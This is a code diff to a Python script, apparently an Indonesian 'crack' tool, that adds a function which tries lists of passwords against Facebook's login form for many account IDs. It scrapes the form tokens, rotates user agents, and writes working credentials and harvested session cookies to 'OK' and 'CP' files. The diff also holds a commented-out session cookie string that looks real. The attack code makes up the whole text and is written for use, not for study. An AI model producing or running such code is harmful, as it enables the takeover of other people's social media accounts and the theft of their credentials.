@@ -1446,8 +1446,106 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
-
 def mbasic(idf,pwv):
+	global loop,ok,cp
+	prog.update(des, description=f"[[bold green] UPDATE FANKY86 [bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
+	ua = random.choice(baru)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			headers = {
+				'authority': 'vi-vn.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cache-control': 'max-age=0',
+				# 'cookie': 'sb=SAVMZz_TH4HxkO3QcMKAdTXi; datr=KQpMZzU46oSFihw3F7sKhAHL; dpr=1.4956257343292236; ps_l=1; ps_n=1; m_pixel_ratio=1.3603438138961792; wd=1048x2010; checkpoint=%7B%22u%22%3A100005231740539%2C%22t%22%3A1733043108%2C%22step%22%3A0%2C%22n%22%3A%22C084Fh6TsVg%3D%22%2C%22inst%22%3A2689027117948320%2C%22f%22%3A193593390684083%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221733043110.ch.s%3Apw.tDBEAiA-ME1EfNEWTXZpfG1-btQfjiXE0Fl2FDy0LHQ7PZ6_ugIgJhXt0ej0uPVMqhVJGX2gAcIEFoCAswiRu75t3apF9Vg%22%2C%22tfvaid%22%3Anull%2C%22tfvasec%22%3Anull%2C%22sat%22%3Anull%2C%22idg%22%3Afalse%2C%22cidue%22%3A%22%22%2C%22tfuln%22%3Anull%2C%22tfvri%22%3Anull%2C%22ct%22%3Anull%2C%22s%22%3A%22AWWoSzP_zXIn-xFReiU%22%2C%22cs%22%3A%5B%5D%2C%22ssp%22%3A1%7D; locale=id_ID; sfiu=AYhYaPV53mQZQ2QzpyiMiXRyoGUrrV4Tgcabs8_rzXt8KYiu1_lhIszZ1Vsvwg0Ew_aop5MaNXY_RNSnq5vS2-H-Wvq5oFnT2fHWBSVYhZEHwC0w8OTnCp5BCmrNfsNsXwlcBjAUN75vnIjlK3LgTSUAmAR90m7aUfzOttqec69JgO9Tr2uyNLt7xQEYZYqDFIf1Z2BpYMZns4dZEVDai82uPOCSo6iZ1Ke84dkFNtFdty8_0vc61pYe2nHiB2ZiGuY; fr=0cJHFH2URwAkVtsCj..BnTAou..AAA.0.0.BnTCO7.AWVdc2Et9GQ',
+				'dpr': '1.600000023841858',
+				'sec-ch-prefers-color-scheme': 'dark',
+				'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"', 
+				'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+				'sec-ch-ua-mobile': '?0',
+				'sec-ch-ua-model': '""',
+				'sec-ch-ua-platform': '"Linux"',
+				'sec-ch-ua-platform-version': '""',
+				'sec-fetch-dest': 'document',
+				'sec-fetch-mode': 'navigate',
+				'sec-fetch-site': 'none',
+				'sec-fetch-user': '?1',
+				'upgrade-insecure-requests': '1',
+				'user-agent': ua,
+				'viewport-width': '980',
+			}
+			requ = ses.get('https://vi-vn.facebook.com/', headers=headers).text
+			head = {
+				'authority': 'vi-vn.facebook.com',
+				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cache-control': 'max-age=0',
+				'content-type': 'application/x-www-form-urlencoded',
+				'dpr': '1.600000023841858',
+				'origin': 'https://vi-vn.facebook.com',
+				'referer': 'https://vi-vn.facebook.com/',
+				'sec-ch-prefers-color-scheme': 'dark',
+				'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+				'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+				'sec-ch-ua-mobile': '?0',
+				'sec-ch-ua-model': '""',
+				'sec-ch-ua-platform': '"Linux"',
+				'sec-ch-ua-platform-version': '""',
+				'sec-fetch-dest': 'document',
+				'sec-fetch-mode': 'navigate',
+				'sec-fetch-site': 'same-origin',
+				'sec-fetch-user': '?1',
+				'upgrade-insecure-requests': '1',
+				'user-agent': ua,
+				'viewport-width': '980',
+			}
+			data = {
+				'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ)).group(1),
+				'lsd': re.search('name="lsd" value="(.*?)"', str(requ)).group(1),
+				'email': idf, # Ganti dengan email yang valid
+				'pass': pw,  # Ganti dengan password yang valid
+				#'login_source': 'comet_headerless_login',
+				'login_source': re.search('name="login_source" value="(.*?)"', str(requ)).group(1),
+				'next':''
+			}
+			login_url = 'https://vi-vn.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+			po= ses.post(login_url, headers=head, data=data)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				cp+=1
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}")
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf + '|' + pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}")
+				cetak(tree)
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			sleep(31)
+	loop+=1
+			
+
+			
+
+
+
+
+
+
+def mbasicff(idf,pwv):
 	global loop,ok,cp
 	prog.update(des, description=f"[[bold green] UPDATE [bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des)
